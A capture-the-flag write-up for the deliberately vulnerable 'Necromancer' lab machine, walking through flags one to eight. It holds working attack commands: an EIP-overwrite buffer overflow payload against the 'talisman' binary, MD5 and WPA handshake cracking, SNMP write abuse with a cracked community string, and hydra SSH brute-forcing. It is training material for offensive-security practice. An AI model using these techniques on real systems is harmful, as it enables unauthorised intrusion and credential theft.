# Writeup: Necromancer

## Flag 1:

We cannot find the machine. Neither with `fping` nor `nmap`:
```bash
export subnet='192.168.10.0/24'
$ nmap -sn -Pn -n --disable-arp-ping 192.168.10.0
$ fping -a -A -q -g 192.168.10.0/24
```

We can get a response with an ARP scan (`-PR`):
```bash
$ nmap -sn -PR -n --packet-trace -oG nmap/arp-scan 192.168.10.0/24
RCVD (1.6895s) ARP reply 192.168.10.107 is-at 08:00:27:63:8B:6E
```

We can also capture some ARP Requests/Replies with `netdiscover`:
```bash
$ netdiscover -i eth0 -r 192.168.10.0/24
 Currently scanning: Finished!   |   Screen View: ARP Reply

 2 Captured ARP Reply packets, from 2 hosts.   Total size: 120
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.10.100  0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.10.107  08:00:27:63:8b:6e      1      60  PCS Systemtechnik GmbH
```

`tcpdump` reveals that the machine tries to connect with us every 60s on to port T:4444:
```bash
$ tcpdump -i eth0 -n 'host 192.168.10.107 and !arp'
12:42:02.987959 IP 192.168.10.107.20684 > 192.168.10.3.4444: Flags [S], seq 1795304564, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3677604567 ecr 0], length 0
12:42:02.987988 IP 192.168.10.3.4444 > 192.168.10.107.20684: Flags [R.], seq 0, ack 1795304565, win 0, length 0

12:43:02.997078 IP 192.168.10.107.43216 > 192.168.10.3.4444: Flags [S], seq 2667724228, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3297616235 ecr 0], length 0
12:43:02.997103 IP 192.168.10.3.4444 > 192.168.10.107.43216: Flags [R.], seq 0, ack 2667724229, win 0, length 0
```

The box sends us some *base64* encoded message.
```bash
$ ncat -lvp 4444 -x p4444.dump
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.10.107.
Ncat: Connection from 192.168.10.107:14859.
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

# decoded message says:
You dig further and discover a small wooden box.
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

## Flag 2:

Flag1 is a MD5 we can crack:
```bash
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt flag1.txt
opensesame
```

Connect to U:666 and send our password:
```bash
$ cat <(echo "opensesame") - | ncat -uv 192.168.10.107 666

A loud crack of thunder sounds as you are knocked to your feet!
[..]
In front of you written in the sand are the words:
flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
[..]
Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
```

## Flag 3:

Doing some image steganography we can find a hidden zip file hidden at offset `0x9082`:
```bash
$ binwalk pileoffeathers.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
-------------------------------------------------------------------------------- 
0             0x0             JPEG image data, EXIF standard    
12            0xC             TIFF image data, little-endian offset of first image directory: 8
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.
txt
37267         0x9193          End of Zip archive, footer length: 22

$ dd if=pileoffeathers.jpg skip=36994 bs=1 > flag3.zip
$ unzip flag3.zip
$ cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

## Flag 4:

There seems nothing to be hidden in `magicbook.jpg` this time. We try to bruteforce some directories:
```bash
$ dirsearch.py -t 50 -e html,php,/ -u http://192.168.10.107/amagicbridgeappearsatthechasm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[16:25:10] 200 -    9KB - /amagicbridgeappearsatthechasm/talisman
```

It's a 32bit ELF binary. No readable strings can be found. It uses a custom `myPrintf` function to de-/encrypt the strings. We can provide input via `scanf` which does not check boundaries!
```bash
$ file talisman 
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped

$ objdump -Mintel -d talisman | grep myPrintf.: -A20
080484f4 <myPrintf>:
 80484f4:       55                      push   ebp
 80484f5:       89 e5                   mov    ebp,esp
 80484f7:       83 ec 08                sub    esp,0x8
 80484fa:       ff 75 08                push   DWORD PTR [ebp+0x8]
 80484fd:       e8 49 ff ff ff          call   804844b <unhide>
 8048502:       83 c4 04                add    esp,0x4
 8048505:       83 ec 08                sub    esp,0x8
 8048508:       ff 75 08                push   DWORD PTR [ebp+0x8]
 804850b:       68 b0 95 04 08          push   0x80495b0
 8048510:       e8 fb fd ff ff          call   8048310 <printf@plt>
 8048515:       83 c4 10                add    esp,0x10
 8048518:       83 ec 0c                sub    esp,0xc
 804851b:       ff 75 08                push   DWORD PTR [ebp+0x8]
 804851e:       e8 7a ff ff ff          call   804849d <hide>
 8048523:       83 c4 10                add    esp,0x10
 8048526:       90                      nop
 8048527:       c9                      leave  
 8048528:       c3                      ret 
```

We can exceed the 32 byte buffer and control EIP. We use it to jump to the function `chantToBreakSpell` at 0x08048a37:
```bash
>>> import struct
>>> struct.pack('<I', 0x08048a37)
# weird behaviour: \x37 is interpreted as ascii '7'!!!
b'7\x8a\x04\x08'

$ gdb-gef -q ./talisman
gef➤  run <<< $(python -c "import sys; sys.stdout.buffer.write(b'\x41' * 32 + b'\x37\x8a\x04\x08')")

You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.
```

We continue the execution and get:
```bash
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.                                                                The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

## Flag 5:

Once again we crack the hash and send it to a udp port. This time its 31337:
```bash
$ john --format=raw-md5 -w=/usr/share/wordlists/rockyou.txt flag4.hash
blackmagic       (?)

# send to udp port 31337
You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

## Flag 6:

We get the next flag by just requesting the page:
```bash
$ curl -s http://192.168.10.107/thenecromancerwillabsorbyoursoul/ | html2text | grep flag
flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
```

## Flag 7:

We have to unpack the downloaded file multiple times to get a `.cap` file.
```bash
$ file necromancer
necromancer: bzip2 compressed data, block size = 900k
$ mv necromancer necromancer.bz2
$ bzip2 -d necromancer.bz2 
$ file necromancer 
necromancer: POSIX tar archive (GNU)
$ mv necromancer necromancer.tar
```

It captured an `EAPOL`handshake which can be bruted with `aircrack-ng`:
```bash
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b c4:12:f5:0d:5e:95 necromancer.cap
Opening necromancer.cap wait...
Read 2197 packets.

1 potential targets

                              Aircrack-ng 1.5.2

      [00:00:08] 41059/9822768 keys tested (5158.63 k/s)

      Time left: 31 minutes, 36 seconds                          0.42%

                           KEY FOUND! [ death2all ]
```

After that we have the community string for port SNMP running on port U:161:
```bash
$ python /opt/SNMP-Brute/snmpbrute.py -t 192.168.10.107 -c death2all
# or
$ snmpwalk -v 1 192.168.10.107 -c death2all -O f
.iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
.iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
.iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
.iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
End of MIB
```

We get a private community string this time with write permissions (`death2allrw`):
```bash
$ snmpwalk -Os -c death2allrw -v 1 192.168.10.107 sysLocation.0
sysLocation.0 = STRING: Locked - death2allrw!

$ snmpset -c death2allrw -v 1 192.168.10.107 sysLocation.0 s "Unlocked -death2allrw!"
SNMPv2-MIB::sysLocation.0 = STRING: Unlocked -death2allrw!

$ snmpwalk -Os -c death2allrw -v 1 192.168.10.107 sysLocation.0
sysLocation.0 = STRING: flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22
```

## Flag 8:

We got another MD5 hash that we can crack:
```bash
$ john --format=raw-md5 -w=/usr/share/wordlists/rockyou.txt <(echo "9e5494108d10bbd5f9e7ae52239546c4")
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
demonslayer      (?)
```

We got pointed to TCP:22. We try to bruteforce the ssh credentials:
```bash
$ hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt ssh://$ip
[22][ssh] host: 192.168.10.107   login: demonslayer   password: 12345678
$ sshpass -p 12345678 ssh demonslayer@$192.168.10.107
$ pwd
/home/demonslayer
$ ls
flag8.txt
$ cat flag8.txt
You enter the Necromancer's Lair!
[..]
Defend yourself!  Counter attack the Necromancer's spells at u777!
```


